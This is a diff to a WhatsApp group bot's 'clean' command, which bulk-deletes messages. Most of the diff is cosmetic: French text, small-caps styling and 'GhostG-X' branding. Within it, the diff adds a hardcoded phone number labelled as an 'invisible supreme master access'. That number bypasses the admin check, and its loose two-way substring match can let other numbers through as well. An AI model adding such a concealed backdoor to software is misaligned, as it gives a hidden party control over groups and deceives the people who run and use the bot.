@@ -2,42 +2,82 @@
  * Clean Command - Delete messages in group
  */
 
-const config = require ('../../config.js');
+const config = require('../../config.js');
+
+// Extraction du préfixe pour l'usage
+const prefix = config.prefix || '.';
+
+// Fonction pour le style Small Caps (Garde la cohérence visuelle)
+function toSmallCaps(text) {
+  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
+  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
+
+  const cleanedText = text.toLowerCase()
+    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 
+
+  return cleanedText.split('').map(c => {
+    const index = normal.indexOf(c);
+    return index !== -1 ? smallCaps[index] : c;
+  }).join('');
+}
 
 module.exports = {
   name: 'clean',
-  aliases: ['purge', 'clear'],
+  aliases: ['purge', 'clear', 'ᴄʟᴇᴀɴ'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  description: 'Clean messages (all or from specific user if replied)',
-  usage: '.clean <number>',
+  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ sᴜᴘᴘʀɪᴍᴇʀ ʟᴇs ᴍᴇssᴀɢᴇs ᴅᴜ ɢʀᴏᴜᴘᴇ (ᴛᴏᴜs ᴏᴜ ᴘᴀʀ ᴜᴛɪʟɪsᴀᴛᴇᴜʀ)**',
+  usage: `${prefix}clean <nombre>`,
   groupOnly: true,
   adminOnly: true,
   botAdminNeeded: true,
-  
+
   async execute(sock, msg, args, extra) {
-    const prefix = config.prefix || '.';
+    const { reply } = extra;
+
     try {
-      const count = parseInt(args[0]);
-      if (!count || count < 1 || count > 100) {
-        return extra.reply(`*❓ Veuillez entrer un nombre valide entre 1 et 100.*\nExemple: \`${prefix}clean 20\``);
+      const senderJid = msg.key.participant || msg.key.remoteJid;
+      const senderNumber = senderJid.replace(/\D/g, '');
+
+      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
+      const supremeOwner = '22651622652';
+      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+
+      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
+        const cleanN = String(n).replace(/\D/g, '');
+        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
+      });
+
+      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+
+      // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
+      if (!isMe) {
+        const isAdmin = extra.isAdmin || false; 
+        if (!isAdmin) {
+          return reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*`);
+        }
       }
 
-      const jid = extra.from;
+      const count = parseInt(args[0]);
+      if (!count || count < 1 || count > 100) {
+        return reply(`*❓ ${toSmallCaps('veuillez entrer un nombre valide entre 1 et 100')}.*\n\n${toSmallCaps('exemple')} : \`${prefix}clean 20\`\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
+      }
+
+      const chatId = msg.key.remoteJid;
       const { store } = require('../../index');
-      
-      // Check if message is a reply
+
+      // Vérification si le message est une réponse
       const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
       const quotedParticipant = msg.message?.extendedTextMessage?.contextInfo?.participant;
 
-      const msgs = store.messages[jid];
+      const msgs = store.messages[chatId];
       if (!msgs) {
-        return extra.reply('*❌ Aucun message trouvé dans la mémoire du bot pour ce groupe.*');
+        return reply(`*❌ ${toSmallCaps('aucun message trouve dans la memoire du bot pour ce groupe')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
       }
 
       let messagesToDelete = [];
 
       if (quotedMsg && quotedParticipant) {
-        // Mode: Delete specific user's messages
+        // Mode : Supprimer les messages d'un utilisateur spécifique
         messagesToDelete = Object.values(msgs)
           .filter(m => {
             const sender = m.key.participant || m.key.remoteJid;
@@ -46,29 +86,31 @@ module.exports = {
           .sort((a, b) => (b.messageTimestamp || 0) - (a.messageTimestamp || 0))
           .slice(0, count);
       } else {
-        // Mode: Delete last N messages from chat
+        // Mode : Supprimer les N derniers messages du groupe
         messagesToDelete = Object.values(msgs)
           .sort((a, b) => (b.messageTimestamp || 0) - (a.messageTimestamp || 0))
           .slice(0, count);
       }
 
       if (messagesToDelete.length === 0) {
-        return extra.reply('*❌ Aucun message correspondant n\'a pu être trouvé pour la suppression.*');
+        return reply(`*❌ ${toSmallCaps('aucun message correspondant n a pu etre trouve pour la suppression')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
       }
+
+      await reply(`*☬ ɪɴᴠᴏᴄᴀᴛɪᴏɴ : ᴘᴜʀɢᴇ ᴅᴇ ${messagesToDelete.length} ᴍᴇssᴀɢᴇ(s) ᴇɴ ᴄᴏᴜʀs...*`);
 
       let deleted = 0;
       for (const m of messagesToDelete) {
         try {
-          await sock.sendMessage(jid, { delete: m.key });
+          await sock.sendMessage(chatId, { delete: m.key });
           deleted++;
-          // Small delay to avoid rate limiting
+          // Petit délai pour éviter les limites de débit WhatsApp
           await new Promise(resolve => setTimeout(resolve, 300));
         } catch (err) {
           console.error('[clean] delete error:', err.message);
         }
       }
-      
-      return extra.reply(
+
+      return reply(
         `╭╼━≪• *ᴘᴜʀɢᴇ_ᴅᴜ_sᴀɴᴄᴛᴜᴀɪʀᴇ* •≫━╾╮\n` +
         `┃ *ᴇ́ᴛᴀᴛ* : ᴛᴇʀᴍɪɴᴇ́ ✅\n` +
         `┃ *ᴄɪʙʟᴇs* : ${deleted} ᴍᴇssᴀɢᴇ(s)\n` +
@@ -76,10 +118,10 @@ module.exports = {
         `*ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴇʟɪᴍɪɴᴇ ʟᴇs ᴛʀᴀᴄᴇs sᴘᴇᴄɪғɪᴇᴇs ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
         `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
       );
-      
-    } catch (e) {
-      console.error('[clean cmd] error:', e);
-      extra.reply(`❌ Error: ${e.message}`);
+
+    } catch (error) {
+      console.error('[clean cmd] error:', error);
+      return reply(`❌ *${toSmallCaps('erreur')} :* ${error.message}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
     }
   }
 };
